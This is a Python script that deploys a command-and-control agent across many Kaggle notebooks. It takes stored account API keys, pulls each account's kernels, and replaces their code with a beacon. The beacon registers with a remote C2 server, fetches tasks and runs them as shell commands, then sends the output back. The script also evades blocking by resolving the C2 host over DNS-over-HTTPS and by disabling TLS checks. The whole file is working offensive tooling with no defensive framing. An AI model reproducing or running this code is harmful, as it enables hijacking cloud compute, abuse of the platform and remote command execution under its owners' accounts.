#!/usr/bin/env python3
"""Run batch-join-c2 logic directly (bypasses HTTP)."""
import sys
import os
from pathlib import Path

# Load config
def get_config(key, default=""):
    import sqlite3
    conn = sqlite3.connect(Path(__file__).resolve().parent.parent / "data" / "c2.db")
    conn.row_factory = sqlite3.Row
    row = conn.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
    conn.close()
    return row["value"] if row else default

def _get_public_url():
    # Kaggle may block trycloudflare.com - use public_url_kaggle if set (e.g. http://kaggle2.ddns.net:18443)
    u = get_config("public_url_kaggle", "").strip()
    if u and (u.startswith("http://") or u.startswith("https://")):
        return u.rstrip("/")
    u = get_config("public_url", "").strip()
    if u and (u.startswith("http://") or u.startswith("https://")):
        return u.rstrip("/")
    return ""

# Import after path setup
from autoreg.engine import account_store
import json
import subprocess

def _get_account_kernels(username, api_key):
    """Get real kernel slugs from Kaggle API (kaggle kernels list --mine)."""
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    try:
        env = os.environ.copy(); env.pop("PYTHONPATH", None)
        r = subprocess.run(["/usr/local/bin/python3.12", "/home/kali/.local/bin/kaggle", "kernels", "list", "--mine"], capture_output=True, text=True, timeout=30, env=env)
        if r.returncode != 0:
            return []
        slugs = []
        for line in r.stdout.strip().split("\n")[2:]:
            parts = line.split()
            if parts and "/" in parts[0]:
                slugs.append(parts[0].strip())
        return slugs
    except Exception:
        return []

# Load accounts
accounts = account_store.get_all()
c2_url = _get_public_url()
if not c2_url:
    print("ERROR: No Public URL set. Configure in Settings.")
    sys.exit(1)

def _valid_api_key(key):
    if not key or not isinstance(key, str):
        return False
    key = key.strip()
    if key in ("???", "xxx", "..."):
        return False
    return len(key) >= 20  # legacy ~32 hex, KGAT_ longer

targets = []
for a in accounts:
    if a.get("platform") != "kaggle":
        continue
    api_key = a.get("api_key_legacy") or a.get("api_key_new") or ""
    if not _valid_api_key(api_key):
        continue
    username = a.get("kaggle_username") or a.get("username", "")
    if not username:
        continue
    slugs = _get_account_kernels(username, api_key)
    if not slugs:
        slugs = [m.get("slug", m) if isinstance(m, dict) else m for m in (a.get("machines") or []) if m]
    for slug in slugs:
        if slug and isinstance(slug, str):
            targets.append({"username": username, "api_key": api_key, "kernel_slug": slug, "email": a.get("email", "")})

if not targets:
    print("ERROR: No Kaggle machines with API keys found.")
    sys.exit(1)

# Limit for quick test: pass --quick to deploy ALL machines of the FIRST account only
import sys
quick = "--quick" in sys.argv
if quick and targets:
    first_user = targets[0]["username"]
    targets = [t for t in targets if t["username"] == first_user]
elif not quick:
    targets = targets[:200]
print(f"Public URL: {c2_url}")
print(f"Targets: {len(targets)} machines")
print("Starting batch deploy...")

# Agent code - must match server.py KAGGLE_C2_AGENT_CODE
# Uses requests (Kaggle has it); verify=False for Cloudflare tunnel
# KERNEL_SLUG injected per-target for stable agent_id
KAGGLE_C2_AGENT_CODE = '''import os,sys,json,time,socket,platform,subprocess,hashlib,threading,struct,base64,ssl
import urllib3
urllib3.disable_warnings()
try: import requests
except: requests=None
C2_URL="{c2_url}"
C2_HOST="{c2_host}"
C2_IP="{c2_ip}"
KERNEL_SLUG="{kernel_slug}"
AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
print(f"[C2] Agent {{AGENT_ID}} | URL={{C2_URL}} | IP={{C2_IP}}",flush=True)
def _doh_resolve(hostname):
    try:
        qname=b"".join(bytes([len(p)])+p.encode() for p in hostname.split("."))+b"\x00"
        query=struct.pack(">HHHHHH",0,0x0100,1,0,0,0)+qname+struct.pack(">HH",1,1)
        encoded=base64.urlsafe_b64encode(query).decode().rstrip("=")
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        from urllib.request import Request,urlopen,HTTPSHandler,build_opener
        opener=build_opener(HTTPSHandler(context=ctx))
        resp=opener.open(Request(f"https://1.1.1.1/dns-query?dns={{encoded}}",headers={{"Accept":"application/dns-message","User-Agent":"curl"}}),timeout=10)
        dns=resp.read();ancount=struct.unpack(">H",dns[6:8])[0];pos=12
        while pos<len(dns) and dns[pos]!=0:pos+=dns[pos]+1
        pos+=5
        for _ in range(ancount):
            if dns[pos]>=0xC0:pos+=2
            else:
                while dns[pos]!=0:pos+=dns[pos]+1
                pos+=1
            rtype,rclass,ttl,rdlen=struct.unpack(">HHIH",dns[pos:pos+10]);pos+=10
            if rtype==1 and rdlen==4:return ".".join(str(b) for b in dns[pos:pos+4])
            pos+=rdlen
    except Exception as e:print(f"[DoH] {{e}}",flush=True)
    return None
def _resolve_ip():
    global C2_IP
    if C2_IP:return C2_IP
    ip=_doh_resolve(C2_HOST)
    if ip:C2_IP=ip;print(f"[DoH] {{C2_HOST}} -> {{ip}}",flush=True)
    return C2_IP
def _post(path,data):
    from urllib.request import Request,urlopen,HTTPSHandler,build_opener
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    opener=build_opener(HTTPSHandler(context=ctx))
    urls=[C2_URL]
    ip=_resolve_ip()
    if ip and C2_HOST:urls.append(f"https://{{ip}}/")
    for url in urls:
        for attempt in range(3):
            try:
                body=json.dumps(data).encode()
                hdrs={{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}}
                if ip and C2_HOST and ip in url:hdrs["Host"]=C2_HOST
                if requests:
                    r=requests.post(url.rstrip("/")+path,json=data,timeout=25,verify=False,headers={{"User-Agent":"Mozilla/5.0"}})
                    if r.ok:return r.json()
                else:
                    req=Request(url.rstrip("/")+path,data=body,headers=hdrs)
                    return json.loads(opener.open(req,timeout=25).read())
            except Exception as e:
                print(f"[C2] {{url}} attempt {{attempt+1}}: {{e}}",flush=True)
                time.sleep(2)
    return {{"tasks":[]}}
def register():
    info={{"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"username":os.popen("whoami").read().strip(),"os":"Kaggle "+platform.system(),"arch":platform.machine(),"ip_internal":socket.gethostname(),"platform_type":"kaggle"}}
    r=_post("/api/agent/register",info)
    print(f"[C2] register: {{r}}",flush=True)
    return r
def beacon():
    while True:
        try:
            r=_post("/api/agent/beacon",{{"id":AGENT_ID}})
            for t in r.get("tasks",[]):
                out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
                _post("/api/agent/result",{{"task_id":t["id"],"result":out[:65000]}})
        except:pass
        time.sleep(5)
register()
threading.Thread(target=beacon,daemon=True).start()
print("[C2] beacon started",flush=True)
while True:time.sleep(60)
'''

KAGGLE_BIN = ["/usr/local/bin/python3.12", "/home/kali/.local/bin/kaggle"]

def _clean_env():
    """Return env without PYTHONPATH to avoid kaggle/ folder shadowing system package."""
    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    return env

def _deploy_code_to_kernel(username, api_key, kernel_slug, code):
    import subprocess as _sp
    import tempfile
    kaggle_dir = Path.home() / ".kaggle"
    kaggle_dir.mkdir(parents=True, exist_ok=True)
    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
    (kaggle_dir / "kaggle.json").chmod(0o600)
    # Use slug as-is: Kaggle accepts both machine_1_... and machine-1-... depending on creation
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp = Path(tmpdir)
            r = _sp.run(KAGGLE_BIN + ["kernels", "pull", kernel_slug, "-p", tmpdir, "-m"], capture_output=True, text=True, timeout=60, env=_clean_env())
            if r.returncode != 0:
                err = (r.stderr or r.stdout or "").strip()[:200]
                if err:
                    print(f"  Kaggle: {err}", end=" ")
                return False
            nb_files = list(tmp.glob("*.ipynb"))
            if not nb_files:
                return False
            nb = json.loads(nb_files[0].read_text())
            lines = [line + "\n" for line in code.split("\n")]
            nb["cells"] = [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": lines}]
            nb_files[0].write_text(json.dumps(nb, indent=2))
            meta_path = tmp / "kernel-metadata.json"
            meta = json.loads(meta_path.read_text()) if meta_path.exists() else {}
            meta.update({
                "id": kernel_slug,
                "title": kernel_slug.split("/")[-1].replace("-", " "),
                "code_file": nb_files[0].name,
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_tpu": False,
                "enable_internet": True,
            })
            meta.setdefault("dataset_sources", [])
            meta.setdefault("competition_sources", [])
            meta.setdefault("kernel_sources", [])
            meta.setdefault("model_sources", [])
            meta_path.write_text(json.dumps(meta, indent=2))
            r2 = _sp.run(KAGGLE_BIN + ["kernels", "push", "-p", tmpdir], capture_output=True, text=True, timeout=120, env=_clean_env())
            return r2.returncode == 0
    except Exception as e:
        print(f"  Exception: {e}")
        return False

success = 0
failed = 0

# Resolve C2 IP for direct connection (Kaggle may block DNS)
import socket as _socket
from urllib.parse import urlparse as _urlparse
_parsed = _urlparse(c2_url)
c2_host = _parsed.hostname or ""
try:
    c2_ip = _socket.gethostbyname(c2_host)
except Exception:
    c2_ip = ""
print(f"C2 host: {c2_host} -> IP: {c2_ip}")

for i, t in enumerate(targets):
    print(f"[{i+1}/{len(targets)}] {t['email']} / {t['kernel_slug']}...", end=" ", flush=True)
    code = KAGGLE_C2_AGENT_CODE.format(c2_url=c2_url, c2_host=c2_host, c2_ip=c2_ip, kernel_slug=t["kernel_slug"])
    ok = _deploy_code_to_kernel(t["username"], t["api_key"], t["kernel_slug"], code)
    if ok:
        success += 1
        print("OK")
    else:
        failed += 1
        print("FAIL")
    import time
    time.sleep(1)

print(f"\nDone: {success} ok, {failed} failed")
